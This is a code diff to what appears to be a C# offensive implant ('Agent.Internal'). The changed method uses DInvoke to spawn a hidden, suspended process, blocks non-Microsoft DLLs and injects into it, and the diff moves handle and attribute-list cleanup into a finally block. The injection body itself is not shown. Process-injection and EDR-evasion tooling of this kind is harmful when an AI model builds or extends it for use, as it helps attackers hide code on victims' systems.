@@ -139,10 +139,12 @@ namespace Agent.Internal
         {
             var ret = new InjectionResult();
 
+            var startupInfoEx = new DInvoke.DynamicInvoke.STARTUPINFOEX();
+            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+            IntPtr outPipe_rd = IntPtr.Zero;
+
             try
             {
-                var startupInfoEx = new DInvoke.DynamicInvoke.STARTUPINFOEX();
-
                 _ = DInvoke.DynamicInvoke.Process.InitializeProcThreadAttributeList(ref startupInfoEx.lpAttributeList, 2);
 
                 const long BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
@@ -163,7 +165,7 @@ namespace Agent.Internal
                 saAttr.lpSecurityDescriptor = IntPtr.Zero;
 
                 //Create pipe to read std out
-                DInvoke.DynamicInvoke.Process.CreatePipe(out var outPipe_rd, out var outPipe_w, ref saAttr);
+                DInvoke.DynamicInvoke.Process.CreatePipe(out outPipe_rd, out var outPipe_w, ref saAttr);
 
                 // Ensure the read handle to the pipe for STDOUT is not inherited.
                 DInvoke.DynamicInvoke.Process.SetHandleInformation(outPipe_rd, DInvoke.DynamicInvoke.HANDLE_FLAGS.INHERIT, 0);
@@ -184,7 +186,7 @@ namespace Agent.Internal
                     EXTENDED_STARTUP_INFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
                     Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                     ref startupInfoEx,
-                    out var pInfo, true);
+                    out pInfo, true);
 
 
                 //Inject=====================================================================================================================================================
@@ -277,8 +279,6 @@ namespace Agent.Internal
                     ret.Output += Encoding.UTF8.GetString(b);
                 }
 
-                DInvoke.DynamicInvoke.Process.CloseHandle(outPipe_rd);
-
                 ret.Succeed = true;
                 return ret;
 
@@ -291,7 +291,23 @@ namespace Agent.Internal
             }
             finally
             {
+                if (startupInfoEx.lpAttributeList != IntPtr.Zero)
+                {
+                    DInvoke.DynamicInvoke.Process.DeleteProcThreadAttributeList(ref startupInfoEx.lpAttributeList);
+                    Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
+                }
+                //Marshal.FreeHGlobal(lpValue);
 
+                // Close process and thread handles
+                if (pInfo.hProcess != IntPtr.Zero)
+                {
+                    DInvoke.DynamicInvoke.Process.CloseHandle(pInfo.hProcess);
+                }
+                if (pInfo.hThread != IntPtr.Zero)
+                {
+                    DInvoke.DynamicInvoke.Process.CloseHandle(pInfo.hThread);
+                }
+                DInvoke.DynamicInvoke.Process.CloseHandle(outPipe_rd);
             }
         }
 
